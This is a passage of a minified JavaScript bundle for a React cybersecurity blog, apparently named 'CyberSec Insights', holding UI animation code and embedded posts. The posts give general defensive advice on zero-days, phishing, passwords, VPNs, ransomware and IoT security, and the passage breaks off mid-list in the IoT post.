Bf(n){n.finishAnimation(),n.targetDelta=n.relativeTarget=n.target=void 0,n.isProjectionDirty=!0}function t1(n){n.resolveTargetDelta()}function i1(n){n.calcProjection()}function n1(n){n.resetRotation()}function r1(n){n.removeLeadSnapshot()}function Nf(n,t,r){n.translate=Be(t.translate,0,r),n.scale=Be(t.scale,1,r),n.origin=t.origin,n.originPoint=t.originPoint}function Ff(n,t,r,s){n.min=Be(t.min,r.min,s),n.max=Be(t.max,r.max,s)}function s1(n,t,r,s){Ff(n.x,t.x,r.x,s),Ff(n.y,t.y,r.y,s)}function o1(n){return n.animationValues&&n.animationValues.opacityExit!==void 0}const a1={duration:.45,ease:[.4,0,.1,1]},zf=n=>typeof navigator<"u"&&navigator.userAgent.toLowerCase().includes(n),Uf=zf("applewebkit/")&&!zf("chrome/")?Math.round:Ue;function Vf(n){n.min=Uf(n.min),n.max=Uf(n.max)}function l1(n){Vf(n.x),Vf(n.y)}function zm(n,t,r){return n==="position"||n==="preserve-aspect"&&!Uc(Df(t),Df(r),.2)}const c1=Fm({attachResizeListener:(n,t)=>ai(n,"resize",t),measureScroll:()=>({x:document.documentElement.scrollLeft||document.body.scrollLeft,y:document.documentElement.scrollTop||document.body.scrollTop}),checkIsScrollRoot:()=>!0}),kc={current:void 0},Um=Fm({measureScroll:n=>({x:n.scrollLeft,y:n.scrollTop}),defaultParent:()=>{if(!kc.current){const n=new c1({});n.mount(window),n.setOptions({layoutScroll:!0}),kc.current=n}return kc.current},resetTransform:(n,t)=>{n.style.transform=t!==void 0?t:"none"},checkIsScrollRoot:n=>window.getComputedStyle(n).position==="fixed"}),d1={pan:{Feature:Cx},drag:{Feature:Ax,ProjectionNode:Um,MeasureLayout:jm}},u1=/var\((--[a-zA-Z0-9-_]+),? ?([a-zA-Z0-9 ()%#.,-]+)?\)/;function h1(n){const t=u1.exec(n);if(!t)return[,];const[,r,s]=t;return[r,s]}function $c(n,t,r=1){const[s,a]=h1(n);if(!s)return;const c=window.getComputedStyle(t).getPropertyValue(s);if(c){const d=c.trim();return Tm(d)?parseFloat(d):d}else return jc(a)?$c(a,t,r+1):a}function p1(n,{...t},r){const s=n.current;if(!(s instanceof Element))return{target:t,transitionEnd:r};r&&(r={...r}),n.values.forEach(a=>{const c=a.get();if(!jc(c))return;const d=$c(c,s);d&&a.set(d)});for(const a in t){const c=t[a];if(!jc(c))continue;const d=$c(c,s);d&&(t[a]=d,r||(r={}),r[a]===void 0&&(r[a]=c))}return{target:t,transitionEnd:r}}const f1=new Set(["width","height","top","left","right","bottom","x","y","translateX","translateY"]),Vm=n=>f1.has(n),g1=n=>Object.keys(n).some(Vm),Wf=n=>n===gn||n===le,Hf=(n,t)=>parseFloat(n.split(", ")[t]),$f=(n,t)=>(r,{transform:s})=>{if(s==="none"||!s)return 0;const a=s.match(/^matrix3d\((.+)\)$/);if(a)return Hf(a[1],t);{const c=s.match(/^matrix\((.+)\)$/);return c?Hf(c[1],n):0}},m1=new Set(["x","y","z"]),y1=us.filter(n=>!m1.has(n));function b1(n){const t=[];return y1.forEach(r=>{const s=n.getValue(r);s!==void 0&&(t.push([r,s.get()]),s.set(r.startsWith("scale")?1:0))}),t.length&&n.render(),t}const ir={width:({x:n},{paddingLeft:t="0",paddingRight:r="0"})=>n.max-n.min-parseFloat(t)-parseFloat(r),height:({y:n},{paddingTop:t="0",paddingBottom:r="0"})=>n.max-n.min-parseFloat(t)-parseFloat(r),top:(n,{top:t})=>parseFloat(t),left:(n,{left:t})=>parseFloat(t),bottom:({y:n},{top:t})=>parseFloat(t)+(n.max-n.min),right:({x:n},{left:t})=>parseFloat(t)+(n.max-n.min),x:$f(4,13),y:$f(5,14)};ir.translateX=ir.x;ir.translateY=ir.y;const v1=(n,t,r)=>{const s=t.measureViewportBox(),a=t.current,c=getComputedStyle(a),{display:d}=c,h={};d==="none"&&t.setStaticValue("display",n.display||"block"),r.forEach(f=>{h[f]=ir[f](s,c)}),t.render();const p=t.measureViewportBox();return r.forEach(f=>{const m=t.getValue(f);m&&m.jump(h[f]),n[f]=ir[f](p,c)}),n},w1=(n,t,r={},s={})=>{t={...t},s={...s};const a=Object.keys(t).filter(Vm);let c=[],d=!1;const h=[];if(a.forEach(p=>{const f=n.getValue(p);if(!n.hasValue(p))return;let m=r[p],y=Gr(m);const v=t[p];let w;if($o(v)){const E=v.length,T=v[0]===null?1:0;m=v[T],y=Gr(m);for(let C=T;C<E&&v[C]!==null;C++)w?yd(Gr(v[C])===w):w=Gr(v[C])}else w=Gr(v);if(y!==w)if(Wf(y)&&Wf(w)){const E=f.get();typeof E=="string"&&f.set(parseFloat(E)),typeof v=="string"?t[p]=parseFloat(v):Array.isArray(v)&&w===le&&(t[p]=v.map(parseFloat))}else y?.transform&&w?.transform&&(m===0||v===0)?m===0?f.set(w.transform(m)):t[p]=y.transform(v):(d||(c=b1(n),d=!0),h.push(p),s[p]=s[p]!==void 0?s[p]:t[p],f.jump(v))}),h.length){const p=h.indexOf("height")>=0?window.pageYOffset:null,f=v1(t,n,h);return c.length&&c.forEach(([m,y])=>{n.getValue(m).set(y)}),n.render(),ta&&p!==null&&window.scrollTo({top:p}),{target:f,transitionEnd:s}}else return{target:t,transitionEnd:s}};function k1(n,t,r,s){return g1(t)?w1(n,t,r,s):{target:t,transitionEnd:s}}const x1=(n,t,r,s)=>{const a=p1(n,t,s);return t=a.target,s=a.transitionEnd,k1(n,t,r,s)},Gc={current:null},Wm={current:!1};function T1(){if(Wm.current=!0,!!ta)if(window.matchMedia){const n=window.matchMedia("(prefers-reduced-motion)"),t=()=>Gc.current=n.matches;n.addListener(t),t()}else Gc.current=!1}function S1(n,t,r){const{willChange:s}=t;for(const a in t){const c=t[a],d=r[a];if(mt(c))n.addValue(a,c),Jo(s)&&s.add(a);else if(mt(d))n.addValue(a,tr(c,{owner:n})),Jo(s)&&s.remove(a);else if(d!==c)if(n.hasValue(a)){const h=n.getValue(a);!h.hasAnimated&&h.set(c)}else{const h=n.getStaticValue(a);n.addValue(a,tr(h!==void 0?h:c,{owner:n}))}}for(const a in r)t[a]===void 0&&n.removeValue(a);return t}const Gf=new WeakMap,Hm=Object.keys(as),A1=Hm.length,qf=["AnimationStart","AnimationComplete","Update","BeforeLayoutMeasure","LayoutMeasure","LayoutAnimationStart","LayoutAnimationComplete"],C1=ld.length;class P1{constructor({parent:t,props:r,presenceContext:s,reducedMotionConfig:a,visualState:c},d={}){this.current=null,this.children=new Set,this.isVariantNode=!1,this.isControllingVariants=!1,this.shouldReduceMotion=null,this.values=new Map,this.features={},this.valueSubscriptions=new Map,this.prevMotionValues={},this.events={},this.propEventSubscriptions={},this.notifyUpdate=()=>this.notify("Update",this.latestValues),this.render=()=>{this.current&&(this.triggerBuild(),this.renderInstance(this.current,this.renderState,this.props.style,this.projection))},this.scheduleRender=()=>_e.render(this.render,!1,!0);const{latestValues:h,renderState:p}=c;this.latestValues=h,this.baseTarget={...h},this.initialValues=r.initial?{...h}:{},this.renderState=p,this.parent=t,this.props=r,this.presenceContext=s,this.depth=t?t.depth+1:0,this.reducedMotionConfig=a,this.options=d,this.isControllingVariants=na(r),this.isVariantNode=Eg(r),this.isVariantNode&&(this.variantChildren=new Set),this.manuallyAnimateOnMount=!!(t&&t.current);const{willChange:f,...m}=this.scrapeMotionValuesFromProps(r,{});for(const y in m){const v=m[y];h[y]!==void 0&&mt(v)&&(v.set(h[y],!1),Jo(f)&&f.add(y))}}scrapeMotionValuesFromProps(t,r){return{}}mount(t){this.current=t,Gf.set(t,this),this.projection&&!this.projection.instance&&this.projection.mount(t),this.parent&&this.isVariantNode&&!this.isControllingVariants&&(this.removeFromVariantTree=this.parent.addVariantChild(this)),this.values.forEach((r,s)=>this.bindToMotionValue(s,r)),Wm.current||T1(),this.shouldReduceMotion=this.reducedMotionConfig==="never"?!1:this.reducedMotionConfig==="always"?!0:Gc.current,this.parent&&this.parent.children.add(this),this.update(this.props,this.presenceContext)}unmount(){Gf.delete(this.current),this.projection&&this.projection.unmount(),ui(this.notifyUpdate),ui(this.render),this.valueSubscriptions.forEach(t=>t()),this.removeFromVariantTree&&this.removeFromVariantTree(),this.parent&&this.parent.children.delete(this);for(const t in this.events)this.events[t].clear();for(const t in this.features)this.features[t].unmount();this.current=null}bindToMotionValue(t,r){const s=fn.has(t),a=r.on("change",d=>{this.latestValues[t]=d,this.props.onUpdate&&_e.update(this.notifyUpdate,!1,!0),s&&this.projection&&(this.projection.isTransformDirty=!0)}),c=r.on("renderRequest",this.scheduleRender);this.valueSubscriptions.set(t,()=>{a(),c()})}sortNodePosition(t){return!this.current||!this.sortInstanceNodePosition||this.type!==t.type?0:this.sortInstanceNodePosition(this.current,t.current)}loadFeatures({children:t,...r},s,a,c){let d,h;for(let p=0;p<A1;p++){const f=Hm[p],{isEnabled:m,Feature:y,ProjectionNode:v,MeasureLayout:w}=as[f];v&&(d=v),m(r)&&(!this.features[f]&&y&&(this.features[f]=new y(this)),w&&(h=w))}if((this.type==="html"||this.type==="svg")&&!this.projection&&d){this.projection=new d(this.latestValues,this.parent&&this.parent.projection);const{layoutId:p,layout:f,drag:m,dragConstraints:y,layoutScroll:v,layoutRoot:w}=r;this.projection.setOptions({layoutId:p,layout:f,alwaysMeasureLayout:!!m||y&&Qn(y),visualElement:this,scheduleRender:()=>this.scheduleRender(),animationType:typeof f=="string"?f:"both",initialPromotionConfig:c,layoutScroll:v,layoutRoot:w})}return h}updateFeatures(){for(const t in this.features){const r=this.features[t];r.isMounted?r.update():(r.mount(),r.isMounted=!0)}}triggerBuild(){this.build(this.renderState,this.latestValues,this.options,this.props)}measureViewportBox(){return this.current?this.measureInstanceViewportBox(this.current,this.props):He()}getStaticValue(t){return this.latestValues[t]}setStaticValue(t,r){this.latestValues[t]=r}makeTargetAnimatable(t,r=!0){return this.makeTargetAnimatableFromInstance(t,this.props,r)}update(t,r){(t.transformTemplate||this.props.transformTemplate)&&this.scheduleRender(),this.prevProps=this.props,this.props=t,this.prevPresenceContext=this.presenceContext,this.presenceContext=r;for(let s=0;s<qf.length;s++){const a=qf[s];this.propEventSubscriptions[a]&&(this.propEventSubscriptions[a](),delete this.propEventSubscriptions[a]);const c=t["on"+a];c&&(this.propEventSubscriptions[a]=this.on(a,c))}this.prevMotionValues=S1(this,this.scrapeMotionValuesFromProps(t,this.prevProps),this.prevMotionValues),this.handleChildMotionValue&&this.handleChildMotionValue()}getProps(){return this.props}getVariant(t){return this.props.variants?this.props.variants[t]:void 0}getDefaultTransition(){return this.props.transition}getTransformPagePoint(){return this.props.transformPagePoint}getClosestVariantNode(){return this.isVariantNode?this:this.parent?this.parent.getClosestVariantNode():void 0}getVariantContext(t=!1){if(t)return this.parent?this.parent.getVariantContext():void 0;if(!this.isControllingVariants){const s=this.parent?this.parent.getVariantContext()||{}:{};return this.props.initial!==void 0&&(s.initial=this.props.initial),s}const r={};for(let s=0;s<C1;s++){const a=ld[s],c=this.props[a];(os(c)||c===!1)&&(r[a]=c)}return r}addVariantChild(t){const r=this.getClosestVariantNode();if(r)return r.variantChildren&&r.variantChildren.add(t),()=>r.variantChildren.delete(t)}addValue(t,r){r!==this.values.get(t)&&(this.removeValue(t),this.bindToMotionValue(t,r)),this.values.set(t,r),this.latestValues[t]=r.get()}removeValue(t){this.values.delete(t);const r=this.valueSubscriptions.get(t);r&&(r(),this.valueSubscriptions.delete(t)),delete this.latestValues[t],this.removeValueFromRenderState(t,this.renderState)}hasValue(t){return this.values.has(t)}getValue(t,r){if(this.props.values&&this.props.values[t])return this.props.values[t];let s=this.values.get(t);return s===void 0&&r!==void 0&&(s=tr(r,{owner:this}),this.addValue(t,s)),s}readValue(t){var r;return this.latestValues[t]!==void 0||!this.current?this.latestValues[t]:(r=this.getBaseTargetFromProps(this.props,t))!==null&&r!==void 0?r:this.readValueFromInstance(this.current,t,this.options)}setBaseTarget(t,r){this.baseTarget[t]=r}getBaseTarget(t){var r;const{initial:s}=this.props,a=typeof s=="string"||typeof s=="object"?(r=md(this.props,s))===null||r===void 0?void 0:r[t]:void 0;if(s&&a!==void 0)return a;const c=this.getBaseTargetFromProps(this.props,t);return c!==void 0&&!mt(c)?c:this.initialValues[t]!==void 0&&a===void 0?void 0:this.baseTarget[t]}on(t,r){return this.events[t]||(this.events[t]=new Cd),this.events[t].add(r)}notify(t,...r){this.events[t]&&this.events[t].notify(...r)}}class $m extends P1{sortInstanceNodePosition(t,r){return t.compareDocumentPosition(r)&2?1:-1}getBaseTargetFromProps(t,r){return t.style?t.style[r]:void 0}removeValueFromRenderState(t,{vars:r,style:s}){delete r[t],delete s[t]}makeTargetAnimatableFromInstance({transition:t,transitionEnd:r,...s},{transformValues:a},c){let d=Hk(s,t||{},this);if(a&&(r&&(r=a(r)),s&&(s=a(s)),d&&(d=a(d))),c){Vk(this,s,d);const h=x1(this,s,d,r);r=h.transitionEnd,s=h.target}return{transition:t,transitionEnd:r,...s}}}function E1(n){return window.getComputedStyle(n)}class I1 extends $m{constructor(){super(...arguments),this.type="html"}readValueFromInstance(t,r){if(fn.has(r)){const s=kd(r);return s&&s.default||0}else{const s=E1(t),a=(Dg(r)?s.getPropertyValue(r):s[r])||0;return typeof a=="string"?a.trim():a}}measureInstanceViewportBox(t,{transformPagePoint:r}){return Dm(t,r)}build(t,r,s,a){ud(t,r,s,a.transformTemplate)}scrapeMotionValuesFromProps(t,r){return gd(t,r)}handleChildMotionValue(){this.childSubscription&&(this.childSubscription(),delete this.childSubscription);const{children:t}=this.props;mt(t)&&(this.childSubscription=t.on("change",r=>{this.current&&(this.current.textContent=`${r}`)}))}renderInstance(t,r,s,a){Ng(t,r,s,a)}}class _1 extends $m{constructor(){super(...arguments),this.type="svg",this.isSVGTag=!1}getBaseTargetFromProps(t,r){return t[r]}readValueFromInstance(t,r){if(fn.has(r)){const s=kd(r);return s&&s.default||0}return r=Fg.has(r)?r:od(r),t.getAttribute(r)}measureInstanceViewportBox(){return He()}scrapeMotionValuesFromProps(t,r){return Ug(t,r)}build(t,r,s,a){pd(t,r,s,this.isSVGTag,a.transformTemplate)}renderInstance(t,r,s,a){zg(t,r,s,a)}mount(t){this.isSVGTag=fd(t.tagName),super.mount(t)}}const R1=(n,t)=>dd(n)?new _1(t,{enableHardwareAcceleration:!1}):new I1(t,{enableHardwareAcceleration:!0}),D1={layout:{ProjectionNode:Um,MeasureLayout:jm}},M1={...sx,...A0,...d1,...D1},et=jw((n,t)=>h0(n,t,M1,R1));function Gm(){const n=S.useRef(!1);return sd(()=>(n.current=!0,()=>{n.current=!1}),[]),n}function j1(){const n=Gm(),[t,r]=S.useState(0),s=S.useCallback(()=>{n.current&&r(t+1)},[t]);return[S.useCallback(()=>_e.postRender(s),[s]),t]}class L1 extends S.Component{getSnapshotBeforeUpdate(t){const r=this.props.childRef.current;if(r&&t.isPresent&&!this.props.isPresent){const s=this.props.sizeRef.current;s.height=r.offsetHeight||0,s.width=r.offsetWidth||0,s.top=r.offsetTop,s.left=r.offsetLeft}return null}componentDidUpdate(){}render(){return this.props.children}}function O1({children:n,isPresent:t}){const r=S.useId(),s=S.useRef(null),a=S.useRef({width:0,height:0,top:0,left:0});return S.useInsertionEffect(()=>{const{width:c,height:d,top:h,left:p}=a.current;if(t||!s.current||!c||!d)return;s.current.dataset.motionPopId=r;const f=document.createElement("style");return document.head.appendChild(f),f.sheet&&f.sheet.insertRule(`
          [data-motion-pop-id="${r}"] {
            position: absolute !important;
            width: ${c}px !important;
            height: ${d}px !important;
            top: ${h}px !important;
            left: ${p}px !important;
          }
        `),()=>{document.head.removeChild(f)}},[t]),S.createElement(L1,{isPresent:t,childRef:s,sizeRef:a},S.cloneElement(n,{ref:s}))}const xc=({children:n,initial:t,isPresent:r,onExitComplete:s,custom:a,presenceAffectsLayout:c,mode:d})=>{const h=Vg(B1),p=S.useId(),f=S.useMemo(()=>({id:p,initial:t,isPresent:r,custom:a,onExitComplete:m=>{h.set(m,!0);for(const y of h.values())if(!y)return;s&&s()},register:m=>(h.set(m,!1),()=>h.delete(m))}),c?void 0:[r]);return S.useMemo(()=>{h.forEach((m,y)=>h.set(y,!1))},[r]),S.useEffect(()=>{!r&&!h.size&&s&&s()},[r]),d==="popLayout"&&(n=S.createElement(O1,{isPresent:r},n)),S.createElement(ea.Provider,{value:f},n)};function B1(){return new Map}function N1(n){return S.useEffect(()=>()=>n(),[])}const on=n=>n.key||"";function F1(n,t){n.forEach(r=>{const s=on(r);t.set(s,r)})}function z1(n){const t=[];return S.Children.forEach(n,r=>{S.isValidElement(r)&&t.push(r)}),t}const U1=({children:n,custom:t,initial:r=!0,onExitComplete:s,exitBeforeEnter:a,presenceAffectsLayout:c=!0,mode:d="sync"})=>{const h=S.useContext(cd).forceRender||j1()[0],p=Gm(),f=z1(n);let m=f;const y=S.useRef(new Map).current,v=S.useRef(m),w=S.useRef(new Map).current,E=S.useRef(!0);if(sd(()=>{E.current=!1,F1(f,w),v.current=m}),N1(()=>{E.current=!0,w.clear(),y.clear()}),E.current)return S.createElement(S.Fragment,null,m.map(R=>S.createElement(xc,{key:on(R),isPresent:!0,initial:r?void 0:!1,presenceAffectsLayout:c,mode:d},R)));m=[...m];const T=v.current.map(on),C=f.map(on),O=T.length;for(let R=0;R<O;R++){const M=T[R];C.indexOf(M)===-1&&!y.has(M)&&y.set(M,void 0)}return d==="wait"&&y.size&&(m=[]),y.forEach((R,M)=>{if(C.indexOf(M)!==-1)return;const L=w.get(M);if(!L)return;const W=T.indexOf(M);let J=R;if(!J){const G=()=>{y.delete(M);const X=Array.from(w.keys()).filter(ne=>!C.includes(ne));if(X.forEach(ne=>w.delete(ne)),v.current=f.filter(ne=>{const ge=on(ne);return ge===M||X.includes(ge)}),!y.size){if(p.current===!1)return;h(),s&&s()}};J=S.createElement(xc,{key:on(L),isPresent:!1,onExitComplete:G,custom:t,presenceAffectsLayout:c,mode:d},L),y.set(M,J)}m.splice(W,0,J)}),m=m.map(R=>{const M=R.key;return y.has(M)?R:S.createElement(xc,{key:on(R),isPresent:!0,presenceAffectsLayout:c,mode:d},R)}),S.createElement(S.Fragment,null,y.size?m:m.map(R=>S.cloneElement(R)))},qm=S.createContext(void 0);function V1({children:n,defaultTheme:t="system",storageKey:r="vite-ui-theme",...s}){const[a,c]=S.useState(()=>localStorage.getItem(r)||t);S.useEffect(()=>{const h=window.document.documentElement;if(h.classList.remove("light","dark"),a==="system"){const p=window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light";h.classList.add(p);return}h.classList.add(a)},[a]);const d={theme:a,setTheme:h=>{localStorage.setItem(r,h),c(h)}};return x.jsx(qm.Provider,{...s,value:d,children:n})}const zi=()=>{const n=S.useContext(qm);if(n===void 0)throw new Error("useTheme must be used within a ThemeProvider");return n},W1=({currentHash:n})=>{const{theme:t}=zi();return x.jsx(et.nav,{initial:{y:-100},animate:{y:0},transition:{type:"spring",stiffness:120,damping:20},className:"sticky top-0 z-50 glassmorphism-nav"})},H1=()=>{const{theme:n}=zi(),t=new Date().getFullYear(),r=n==="dark"?"hover:text-primary":"text-muted-foreground hover:text-primary",s=n==="dark"?"text-slate-400":"text-muted-foreground",a=n==="dark"?"bg-slate-900/60":"bg-slate-50",c=n==="dark"?"border-slate-700/60":"border-border";return x.jsx("footer",{className:`${a} border-t ${c} ${s} py-8 mt-12`,children:x.jsxs("div",{className:"container mx-auto px-4 text-center",children:[x.jsxs("div",{className:"flex justify-center space-x-6 mb-4",children:[x.jsxs("a",{href:"https://github.com",target:"_blank",rel:"noopener noreferrer",className:`${r} transition-colors`,children:[x.jsx(gw,{size:22}),x.jsx("span",{className:"sr-only",children:"GitHub"})]}),x.jsxs("a",{href:"https://linkedin.com",target:"_blank",rel:"noopener noreferrer",className:`${r} transition-colors`,children:[x.jsx(bw,{size:22}),x.jsx("span",{className:"sr-only",children:"LinkedIn"})]}),x.jsxs("a",{href:"https://twitter.com",target:"_blank",rel:"noopener noreferrer",className:`${r} transition-colors`,children:[x.jsx(Tw,{size:22}),x.jsx("span",{className:"sr-only",children:"Twitter"})]})]}),x.jsxs("p",{className:"text-sm",children:["© ",t," CyberSec Insights. All rights reserved."]}),x.jsx("p",{className:"text-xs mt-1",children:"Disclaimer: Information on this blog is for educational purposes only."})]})})},$1=({children:n,routeKey:t})=>x.jsxs("div",{className:"flex flex-col min-h-screen bg-background text-foreground",children:[x.jsx(W1,{currentHash:t}),x.jsx(et.main,{initial:{opacity:0,y:20},animate:{opacity:1,y:0},exit:{opacity:0,y:-20},transition:{duration:.3},className:"flex-grow container mx-auto px-4 py-8",children:n},t),x.jsx(H1,{})]}),Pd=[{id:"zero-day-vulnerabilities-explained",title:"Zero-Day Vulnerabilities: The Unseen Threat",date:"2025-05-23",author:"Alex Cryptos",summary:"Explore what zero-day vulnerabilities are, why they are so dangerous, and how organizations try to mitigate their impact.",tags:["zero-day","vulnerability","exploit","cyber defense"],imageKey:"zeroDayThreat",content:`
          <p>A zero-day vulnerability is a software security flaw that is known to the software vendor but doesn't have a patch in place to fix the flaw. It's called "zero-day" because the vendor has zero days to fix the problem before it potentially becomes known to attackers.</p>
          <h3>Why are Zero-Days Dangerous?</h3>
          <ul>
            <li><strong>No Defense:</strong> Since there's no patch, traditional signature-based antivirus software might not detect attacks exploiting the vulnerability.</li>
            <li><strong>High Value for Attackers:</strong> Zero-day exploits (the code attackers use to take advantage of a zero-day vulnerability) can be sold for high prices on the black market.</li>
            <li><strong>Widespread Impact:</strong> If the vulnerability exists in widely used software, millions of users could be at risk.</li>
          </ul>
          <h3>Mitigation Strategies:</h3>
          <p>While it's impossible to be completely immune to zero-day attacks, organizations and individuals can take steps:</p>
          <ol>
            <li><strong>Patch Management:</strong> Apply security patches promptly when they become available. While this doesn't stop zero-days, it closes known vulnerabilities.</li>
            <li><strong>Behavior-Based Detection:</strong> Security solutions that monitor for suspicious behavior rather than known signatures can sometimes detect zero-day exploits.</li>
            <li><strong>Network Segmentation:</strong> Limiting network access can help contain the damage if a system is compromised.</li>
            <li><strong>Security Awareness:</strong> Educating users about phishing and other attack vectors that might deliver zero-day exploits.</li>
          </ol>
          <p>The fight against zero-day threats is ongoing, requiring vigilance from software vendors, security researchers, and users alike.</p>
        `},{id:"understanding-phishing-attacks",title:"Understanding Phishing Attacks and How to Avoid Them",date:"2025-05-20",author:"Dr. Secure",summary:"Phishing remains one of the most common cyber threats. Learn to identify phishing attempts and protect your personal information.",tags:["phishing","email security","cyber awareness"],imageKey:"phishingConcept",content:`
          <p>Phishing is a type of social engineering attack often used to steal user data, including login credentials and credit card numbers. It happens when an attacker, masquerading as a trusted entity, dupes a victim into opening an email, instant message, or text message. The recipient is then tricked into clicking a malicious link, which can lead to the installation of malware, the freezing of the system as part of a ransomware attack, or the revealing of sensitive information.</p>
          <h3>Common Types of Phishing:</h3>
          <ul>
            <li><strong>Email Phishing:</strong> The most common type, using emails that appear to be from legitimate sources.</li>
            <li><strong>Spear Phishing:</strong> Targets specific individuals or companies, often with personalized information.</li>
            <li><strong>Whaling:</strong> A type of spear phishing aimed at senior executives.</li>
            <li><strong>Smishing and Vishing:</strong> Phishing attempts made via SMS text messages (Smishing) or voice calls (Vishing).</li>
          </ul>
          <h3>How to Identify Phishing Attempts:</h3>
          <ol>
            <li><strong>Check the Sender's Email Address:</strong> Look for slight misspellings or unusual domain names.</li>
            <li><strong>Beware of Urgent or Threatening Language:</strong> Attackers often try to create a sense of urgency.</li>
            <li><strong>Don't Click Suspicious Links:</strong> Hover over links to see the actual URL before clicking.</li>
            <li><strong>Look for Generic Greetings:</strong> "Dear Customer" instead of your name can be a red flag.</li>
            <li><strong>Verify Requests for Personal Information:</strong> Legitimate organizations rarely ask for sensitive data via email.</li>
          </ol>
          <h3>Protecting Yourself:</h3>
          <p>Enable two-factor authentication (2FA) on all your accounts, use strong, unique passwords, and keep your software updated. Be skeptical of unsolicited communications and always verify before providing information or clicking links.</p>
        `},{id:"importance-of-strong-passwords",title:"The Critical Importance of Strong and Unique Passwords",date:"2025-05-15",author:"Jane Cyber",summary:"Passwords are your first line of defense. Discover why strong, unique passwords are vital and how to manage them effectively.",tags:["passwords","account security","best practices"],imageKey:"passwordSecurity",content:`
          <p>In an era where digital accounts hold vast amounts of personal and financial information, the strength of your passwords cannot be overstated. Weak or reused passwords are a primary target for cybercriminals, leading to identity theft, financial loss, and unauthorized access to sensitive data.</p>
          <h3>What Makes a Strong Password?</h3>
          <ul>
            <li><strong>Length:</strong> At least 12-15 characters. Longer is generally better.</li>
            <li><strong>Complexity:</strong> A mix of uppercase letters, lowercase letters, numbers, and symbols.</li>
            <li><strong>Uniqueness:</strong> A different password for every account.</li>
            <li><strong>Unpredictability:</strong> Avoid common words, phrases, or easily guessable information like birthdays or names.</li>
          </ul>
          <h3>Why Unique Passwords Matter:</h3>
          <p>If one account is compromised and you've reused that password elsewhere, attackers can gain access to all those other accounts. This is known as credential stuffing. Using unique passwords for each service significantly limits the damage if one set of credentials is stolen.</p>
          <h3>Password Management Strategies:</h3>
          <ol>
            <li><strong>Use a Password Manager:</strong> These tools generate and store strong, unique passwords for all your accounts. You only need to remember one master password.</li>
            <li><strong>Enable Two-Factor Authentication (2FA):</strong> Adds an extra layer of security beyond just your password.</li>
            <li><strong>Regularly Update Critical Passwords:</strong> Especially for important accounts like banking and email.</li>
          </ol>
          <p>By prioritizing strong password hygiene, you significantly enhance your digital security posture.</p>
        `},{id:"introduction-to-vpn",title:"What is a VPN and Why Should You Use One?",date:"2025-05-10",author:"Net Guardian",summary:"VPNs are powerful tools for enhancing online privacy and security. Understand the basics of VPNs and their benefits.",tags:["vpn","privacy","online security","encryption"],imageKey:"vpnConcept",content:`
          <p>A Virtual Private Network (VPN) is a service that creates a secure, encrypted connection between your device and the internet. It routes your internet traffic through a server operated by the VPN provider, masking your IP address and encrypting your data.</p>
          <h3>How Does a VPN Work?</h3>
          <p>When you connect to a VPN, it establishes a "tunnel" for your data. All your internet traffic passes through this encrypted tunnel to the VPN server. The VPN server then sends your traffic to the internet. To any website or online service you visit, it appears as if your connection is originating from the VPN server's location, not your actual location.</p>
          <h3>Key Benefits of Using a VPN:</h3>
          <ul>
            <li><strong>Enhanced Privacy:</strong> Hides your real IP address, making it harder for websites, advertisers, and your ISP to track your online activities.</li>
            <li><strong>Improved Security:</strong> Encrypts your internet traffic, protecting your data from hackers, especially on public Wi-Fi networks.</li>
            <li><strong>Access Geo-Restricted Content:</strong> Allows you to bypass geographical restrictions on websites and streaming services by connecting to a server in a different country.</li>
            <li><strong>Secure Remote Access:</strong> Businesses use VPNs to allow employees to securely access company networks from remote locations.</li>
          </ul>
          <h3>Choosing a VPN:</h3>
          <p>When selecting a VPN provider, consider factors like their logging policy (no-logs is best), server locations, connection speeds, security protocols offered, and price. Reputable VPNs are transparent about their practices.</p>
          <p>Using a VPN is a simple yet effective step towards a more private and secure online experience.</p>
        `},{id:"ransomware-defense-strategies",title:"Ransomware: How to Defend and Recover",date:"2025-05-05",author:"Data Sentinel",summary:"Ransomware attacks are on the rise. Learn essential defense mechanisms and steps to take if you become a victim.",tags:["ransomware","data backup","incident response"],imageKey:"ransomwareLock",content:`
          <p>Ransomware is a type of malicious software that encrypts a victim's files, making them inaccessible. Attackers then demand a ransom, typically in cryptocurrency, in exchange for the decryption key.</p>
          <h3>Preventative Measures:</h3>
          <ul>
            <li><strong>Regular Backups:</strong> Maintain regular, offline, and tested backups of critical data. This is the most effective defense.</li>
            <li><strong>Security Software:</strong> Use reputable antivirus and anti-malware software and keep it updated.</li>
            <li><strong>Patch Management:</strong> Keep operating systems and applications patched to prevent exploitation of known vulnerabilities.</li>
            <li><strong>Email Security:</strong> Be cautious of email attachments and links, as these are common ransomware delivery vectors.</li>
            <li><strong>User Training:</strong> Educate users on recognizing and avoiding ransomware threats.</li>
          </ul>
          <h3>If You're Attacked:</h3>
          <ol>
            <li><strong>Isolate the Infected System:</strong> Disconnect it from the network immediately to prevent spread.</li>
            <li><strong>Do Not Pay the Ransom (If Possible):</strong> Paying encourages attackers and doesn't guarantee file recovery. Consult law enforcement.</li>
            <li><strong>Restore from Backups:</strong> If you have clean backups, you can restore your systems without paying.</li>
            <li><strong>Report the Incident:</strong> Notify relevant authorities (e.g., local law enforcement, cybersecurity agencies).</li>
          </ol>
          <p>A proactive approach to cybersecurity, centered around robust backups and user awareness, is key to mitigating the risk of ransomware.</p>
        `},{id:"iot-security-risks",title:"The Growing Security Risks of IoT Devices",date:"2025-04-28",author:"ConnectSecure",summary:"Internet of Things (IoT) devices offer convenience but also introduce new security vulnerabilities. Understand the risks and how to secure your smart devices.",tags:["iot","smart devices","network security"],imageKey:"iotNetwork",content:`
          <p>The Internet of Things (IoT) refers to the vast network of physical devices, vehicles, home appliances, and other items embedded with electronics, software, sensors, actuators, and connectivity which enables these objects to connect and exchange data. While offering convenience, IoT devices often lack robust security features, making them targets for attackers.</p>
          <h3>Common IoT Security Risks:</h3>
          <ul>
            <li><strong>Weak Default Passwords:</strong> Many devices ship with easy-to-guess default credentials.</li>
            <li><strong>Lack of Updates:</strong> Manufacturers may not provide timely security patches, or users may fail to apply them.</li>
            <li><strong>Insecure Network Services:</strong> Open ports or unencrypted communication channels can expose devices.</li>
            <li><strong>Data Privacy Concerns:</strong> IoT devices can collect large amounts of personal data, which could be compromised.</li>
            <li><strong>Botnets:</strong> Compromised IoT devices can be roped into botnets for DDoS attacks or other malicious activities.</li>
          </ul>
          <h3>Securing Your IoT Devices:</h3>
          <ol>
            <li><strong>Change Default Passwords:</strong> Immediately change the default username and password on any new IoT device.</li>
            <li><strong>Keep Firmware Updated:</strong> Regularly check for and apply firmware updates from the manufacturer.</li>
